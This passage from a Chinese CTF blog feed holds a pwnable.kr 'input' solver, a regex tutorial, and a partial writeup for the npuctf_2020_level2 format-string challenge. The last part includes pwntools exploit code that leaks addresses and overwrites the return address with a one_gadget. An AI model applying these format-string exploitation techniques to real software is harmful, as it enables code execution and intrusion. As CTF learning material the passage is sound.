<span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    t=<span class="built_in">ord</span>(m[k])^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(t)[<span class="number">2</span>:],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#2ef1bae658e6e938ca2af63e95e372d</span></span><br></pre></td></tr></table></figure><p>把它放到CyberChef中加密发现结果一致，本次可能说就是学了个寂寞吧，因为我最后只要知道它加密解密算法一致这个结论就可以了。但是最重要的还是学会了如何分辨这样的加解密以及它加解密的一个特性，也算小有成就吧，瞬间不emo了哈哈哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable input writeup</title>
      <link href="/2021/11/23/pwnable_input/"/>
      <url>/2021/11/23/pwnable_input/</url>
      
        <content type="html"><![CDATA[<p>真的推荐学linux C的IO一定得做做这个，真的能学到很多。</p><span id="more"></span><p>连接远程服务器把源码下下来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here&#x27;s your flag</span></span><br><span class="line">    system(<span class="string">&quot;/bin/cat flag&quot;</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码大概意思就是给程序五种输入方法，如果程序从指定方法获得了对应的值那么这一关被判正确并且进入下一关，过去五关就能拿到flag。</p><p>第一关是命令行输入，要求命令行有100个参数，然后argv[‘A’]=”\x00”，argv[‘B’]=”\x20\x0a\x0d”，那就给命令行一百个参数，然后满足一下对应的要求即可，这里我们可以选择用execve去执行这个程序。然后程序构造命令行的参数传给第二个参数就可以通过第一关了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    execve(<span class="string">&quot;./input&quot;</span>,arg,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行就可以发现第一关过去了，这个源码可以放在自己电脑编译然后测试哦，等到自己能打通了再去考虑服务器的环境。</p><p>第二关虽然是stdio，但是它这里不仅要求读取特殊字节，还要从stderr中读入特定字节。这里卡了有点久，最后还是google了一下才得到的一个好方法，这里我也贴一下这位师傅这篇博客，我做这个也是参照这位师傅的博客做的–&gt;<a href="https://r00tk1ts.github.io/2018/03/06/input/%EF%BC%8C%E7%89%B9%E6%AD%A4%E6%84%9F%E8%B0%A2%EF%BC%81">https://r00tk1ts.github.io/2018/03/06/input/，特此感谢！</a></p><p>这里呢选择fork一个子进程，然后父子进程用管道通信，父进程把管道接口定向到stdin和stderr后去执行input。子进程通过管道给父进程发送数据，然后父进程就能从stdin和stderr中得到数据了。</p><p>第三关也比较简单，从环境变量中获得对应数据。环境变量其实跟命令行参数输入差不多，execve第三个参数就是环境变量，传入一个指针数组，然后里面给一个xxx=yyy，那么它从环境变量中get(xxx)就会获得yyy。</p><p>第四个就更简单了，它从文件读你就对应写一个文件给它好了。</p><p>第五个稍微有点东西，是关于socket编程的，基本上也可以超，但是也遇到诸多问题，我一个exp并不能打通，我运行一个exp之后会被挂起，我再运行一个exp才能让第一个exp getflag，盲猜是它数据没接收到，我测试之后发现sleep也不管用，但是这一关已经能打过去了。</p><p>但是由于pwnable服务器的特殊机制，我们home 目录没有写的权限，所以得去寻找我们文件能落地的地方，那就是/tmp目录，这里的目录我们有写的权限，但是没有读的权限，所以我们在里面新建一个自己的文件夹，然后把input可执行文件和flag文件链接到这个目录来，最后上传exp执行就可以拿到flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *fd=fopen(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    fwrite(buf,<span class="number">1</span>,<span class="number">4</span>,fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe_stdin[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,pipe_stderr[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">char</span> *env[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;C&#x27;</span>],<span class="string">&quot;55555&quot;</span>);</span><br><span class="line">    env[<span class="number">0</span>]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(env[<span class="number">0</span>],<span class="string">&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;</span>);</span><br><span class="line">    env[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    pipe(pipe_stdin);</span><br><span class="line">    pipe(pipe_stderr);</span><br><span class="line">    <span class="keyword">int</span> p=fork();</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">0</span>)&#123;</span><br><span class="line">        write(pipe_stdin[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        write(pipe_stderr[<span class="number">1</span>],<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        dup2(pipe_stdin[<span class="number">0</span>],<span class="number">0</span>);</span><br><span class="line">        dup2(pipe_stderr[<span class="number">0</span>],<span class="number">2</span>);</span><br><span class="line">        execve(<span class="string">&quot;./input&quot;</span>,arg,env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">    sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    saddr.sin_port = htons(<span class="number">55555</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;connenct\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Cannot connect to server!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(sockfd, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:<code>Mommy! I learned how to pass various input in Linux :)</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> IO </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式的使用</title>
      <link href="/2021/11/19/Re/"/>
      <url>/2021/11/19/Re/</url>
      
        <content type="html"><![CDATA[<p>最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。</p><span id="more"></span><p>那么我已开始接触正则呢，应该是在学爬虫的时候，因为当时爬虫学的不太好也就没有接着学正则匹配。后来在换了linux系统之后经常会用到一个很有用的东西，那就是|grep。不得不说这个在找东西的时候真的是很有用的，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ls -l | grep &quot;&quot;</span><br></pre></td></tr></table></figure><p>那么本次和Nepnep战队参加xctf分区赛也是有一道修复二维码的题目，当时师傅们可能有些点没注意到，导致最后修复的二维码多达16000的扫描结果。</p><p><img src="/2021/11/19/Re/1.png" alt="1"></p><p>得到结果之后本以为要经历漫长的人工过滤，可是咱们战队的一位爷爷直接solved，而这位爷爷就是直接用了正则匹配。</p><p><img src="/2021/11/19/Re/2.png" alt="2"></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式（英语：Regular Expression，常简写为regex、regexp或RE），又称正则表示式、正则表示法、规则表达式、常规表示法，是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>许多程序设计语言都支持利用正则表达式进行字符串操作。例如，在Perl中就内建了一个功能强大的正则表达式引擎。正则表达式这个概念最初是由Unix中的工具软件（例如sed和grep）普及开的。</p><p>以上来自维基百科。</p><h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p>右斜杠(\)老转义符了，在右斜杠之后的一个字将会带有特殊含义，如果要匹配右斜杠则需要双写。</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>通配符我们熟知的就是星号(*)和问号(?)，一般情况下它们分别代表任意多个字符或者是任意一个字符，在正则表达式中存在三种类似的符号，并且不能匹配任意字符，只能代表前面一个字符的数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+：匹配一个或多个字符</span><br><span class="line">?：匹配一个或零个字符</span><br><span class="line">*：匹配零个或多个字符</span><br></pre></td></tr></table></figure><p>例如</p><p>‘a+’可以匹配’a’,’aa’,’aaa’,’aaaa’……等字符串。</p><p>‘a?’可以匹配’a’或者空串</p><p>‘a*’则可以匹配第一种情况和第二种情况的并集。</p><h3 id="匹配任意字符"><a href="#匹配任意字符" class="headerlink" title="匹配任意字符"></a>匹配任意字符</h3><p>[]方括号用于匹配单个字符。</p><p>例如</p><p>[abcde]可以匹配a,b,c,d,e中的任意一个字符。</p><p>如果加上^则代表匹配除了列表以外的所有字符。</p><p>例如</p><p>[^a]表示匹配所有非’a’的字符。</p><h3 id="匹配次数限定"><a href="#匹配次数限定" class="headerlink" title="匹配次数限定"></a>匹配次数限定</h3><p>{}用于限定匹配次数</p><p>例如：</p><p>[ab]{3}表示[ab]匹配三次，[ab]{3,}表示至少匹配三次。</p><p>就先学这么多吧，后续再学就再加。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>npuctf_2020_level2 writeup</title>
      <link href="/2021/11/10/npuctf_2020_level2/"/>
      <url>/2021/11/10/npuctf_2020_level2/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#npuctf_2020_level2">npuctf_2020_level2</a></p><span id="more"></span><p>这题刷新了我对格式化字符串的利用，来康康吧。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>十分简单，就是主函数while循环输入然后格式化字符串漏洞，但是不同的是这个格式化字符串并不在stack段而是在bss段上的。那就考虑考虑字符串在bss段和在stack段的区别，我们平时做的都是在stack段的，因为buf输入一般都是在printf调用之前，所以printf的栈帧会比buf低，而参数在高地址，那么此时printf的参数我们就可控，在buf上写上一个地址然后算出偏移用%n格式串去写就能基本达到任意title写的目的。但是如果它在bss段上或者是在堆上，那么格式化字符串的参数控制不了我们就得另寻方法了。其实也还好，第一步我们可以先控制一个栈的参数，栈里面都会有存函数的ebp，那么可以通过这个来写一个目的地址，再通过目的地址任意写我们想写的内容。讲简单一点其实也就是控制一个栈的地址然后写上目的地址，最后再往目的地址写东西，有格式化字符串漏洞那么基本stack，code和libc地址跟送的一样随便泄露。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>先gdb起这个程序，然后运行到printf这边观察栈情况。</p><p><img src="/2021/11/10/npuctf_2020_level2/1.png" alt="1"></p><p>可以观察到libc的应该是第7个参数，第9个参数有一个栈地址，第六个参数和第11个参数有一个程序加载地址可以泄露。这里的参数个数指的是排除格式化字符串参数后的计数，比如printf(“%d”,1);这里我就直接把1当成第一个参数了。</p><p>所以开局三个地址都出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;%7$p\n%9$p\n%11$p\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br></pre></td></tr></table></figure><p>然后可以看到那个libc得到的值实际上是返回地址，因为main的父函数就是libc_start_main函数嘛。所以我们应该要写这里，怎么写呢？通过栈地址，我们可以通过修改第9个参数的低两个字节到返回地址，然后再%n覆盖，因为不能一次写太多，所以每一次修改最多两个字节，然后马上把这个地址向后移两位然后再写两个字节，至于写什么，那自然是one_gadget最简便了，并且第一个就符合条件了。但是实际操作的时候我傻了，我是通过这个地址写到另一个地址的低两位字节改成了返回地址再通过那个写的，现在想来是在多此一举，但是这样的好处就是可以实现真正的任意写，假如这个题目变成noreturn，那么就只能靠劫持一些hook或者got表来实现指令跳转了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.27&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">2.23 64 libc的one_gadget条件分别是rax,[rsp+0x30,+0x50,+0x70]==NULL</span></span><br><span class="line"><span class="string">2.27 64 libc的one_gadget条件分别是rsp&amp;0xf==0&amp;&amp;rcx==0 || [rsp+0x40，+0x70]==NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_2_23_32=[<span class="number">0x3ac6c</span>,<span class="number">0x3ac6e</span>,<span class="number">0x3ac72</span>,<span class="number">0x3ac79</span>,<span class="number">0x5fbd5</span>,<span class="number">0x5fbd6</span>]</span><br><span class="line">one_2_23_64=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span 